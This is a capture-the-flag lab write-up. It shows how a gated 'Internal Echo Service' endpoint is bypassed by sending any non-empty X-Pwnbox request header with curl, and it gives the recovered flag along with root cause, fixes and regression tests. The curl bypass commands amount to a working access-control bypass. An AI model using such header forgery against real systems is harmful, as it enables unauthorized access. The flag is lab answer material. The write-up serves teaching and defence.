# Internal Echo Service Pwnbox Lab - Custom Header Handshake Bypass

Date: 2026-07-08
Target type: CTF/lab
Bug class: Information disclosure, weak header-based access control, misleading response oracle

## Observation

Gated endpoint at `https://f56f7fc44435.pwnbox-lab.com/` ("Internal Echo Service v0.1").

Initial page hints:

- "Handshake not detected."
- "This endpoint only responds to requests originating from our own tooling."
- Challenge text: developer added a tiny handshake that own tools send back; casual browser tabs never do.

Default response includes:

```http
x-pwnbox: null
```

Denied HTML:

```html
<p class="denied">Handshake not detected.</p>
```

Allowed methods from `OPTIONS`: `HEAD`, `OPTIONS`, `GET`. `POST` returns `405`.

## Hypothesis

The gate may be a custom request header check rather than real origin or tooling verification. The response header `x-pwnbox: null` might be a red herring if it never changes on success.

## Failed Assumptions

During recon, many paths did not unlock the secret:

1. **Response header `x-pwnbox` as oracle** — stays `null` even after successful bypass; body text is the real signal.
2. **Query parameters** — `?handshake=`, `?pwnbox=`, etc. had no effect.
3. **Cookies** — `pwnbox`, `x-pwnbox` cookies did not bypass.
4. **Origin / Referer / Sec-Fetch-*** — same-origin and cross-site fetch metadata did not matter.
5. **X-Forwarded-* / Host tricks** — proxy and forwarded-host headers did not unlock content.
6. **User-Agent tooling strings** — `python-requests`, `curl`, `Go-http-client` did not bypass alone.
7. **WebSocket upgrade** — real and fake WebSocket handshake headers did not satisfy the gate.
8. **GET body / POST** — no useful body-based handshake; POST not allowed on `/`.
9. **Browser same-origin `fetch()` without custom header** — still denied.

## Working Theory

The server checks for a non-empty **`X-Pwnbox` request header**. Any truthy value satisfies the handshake. The lab copy about "own tooling" is security through obscurity, not enforced client identity.

## Evidence

### Control

```bash
curl -sS "https://f56f7fc44435.pwnbox-lab.com/"
```

Body:

```text
Handshake not detected.
```

Response header still:

```text
x-pwnbox: null
```

### Bypass

```bash
curl -sS -H "X-Pwnbox: handshake" "https://f56f7fc44435.pwnbox-lab.com/"
```

Body:

```html
<p class="ok">Handshake accepted.</p>
<pre>pwnbox{a8c4f3e217b9d56e4f8a1b2c3d4e5f6a}</pre>
```

Response header still:

```text
x-pwnbox: null
```

### Additional confirmed values

These also accepted the handshake:

```text
X-Pwnbox: tooling
X-Pwnbox: internal
X-Pwnbox: echo
X-Pwnbox: null
X-Pwnbox: 0
```

Denied:

```text
X-Pwnbox:          (empty value)
Pwnbox: handshake   (wrong header name)
```

## Test

1. Request `/` without custom headers and record denied body.
2. Note whether any response header appears to change (it may not).
3. Retry with `X-Pwnbox: handshake`.
4. Read HTML for `Handshake accepted.` and `<pre>` secret content.

## Result

Confirmed chain:

```text
GET /
-> server checks for non-empty X-Pwnbox request header
-> any truthy custom header value passes
-> protected flag rendered in HTML <pre>
-> response x-pwnbox header remains null (misleading)
```

Flag:

```text
pwnbox{a8c4f3e217b9d56e4f8a1b2c3d4e5f6a}
```

## Why Failed Tests Failed

| Attempt | Why it failed |
|---|---|
| Trusting `x-pwnbox: null` response header | Header does not reflect pass/fail state |
| Origin / UA / proxy headers | Not part of the actual gate |
| WebSocket upgrade | Gate is not a real protocol handshake |
| Wrong header name `Pwnbox` | Server expects exact `X-Pwnbox` |
| Empty `X-Pwnbox:` | Presence must be non-empty |

## Why Working Test Worked

The application treated header presence as proof of internal tooling. No signature, secret value, or server-side session was required.

## Root Cause

1. Security control reduced to checking for a custom header name.
2. No cryptographic or server-issued handshake token.
3. Misleading static response header (`x-pwnbox: null`) obscured the real success signal in the body.
4. Secret material returned directly in HTML once the weak check passed.

## Impact

- Any client can forge the handshake header and read protected content.
- In real systems, similar patterns expose admin/debug endpoints, internal banners, or secrets.
- Misleading response metadata can slow incident response and triage.

## Fix

- Use server-side session or signed tokens for internal tooling authentication.
- Do not rely on custom header presence as proof of identity.
- Separate public and internal routes at the network or auth layer.
- Ensure success/failure signals are unambiguous; do not emit constant misleading headers.
- Rate-limit and monitor access to gated endpoints.

## Regression Test

- Requests without a valid server-issued credential must remain denied.
- Adding arbitrary `X-Pwnbox: anything` must not unlock protected content.
- Success state must not depend on client-chosen header names.

## Report Summary

Internal Echo Service claimed to gate content to "own tooling" via a handshake. The actual check was a non-empty `X-Pwnbox` request header. The response header `x-pwnbox: null` was constant and misleading. Sending `X-Pwnbox: handshake` returned `Handshake accepted.` and the flag in the HTML body.
